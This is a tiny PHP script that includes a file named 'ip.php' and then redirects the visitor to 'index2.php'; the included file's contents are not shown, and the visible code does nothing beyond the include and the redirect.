<?php
include 'ip.php';
header('Location: index2.php');
exit
?>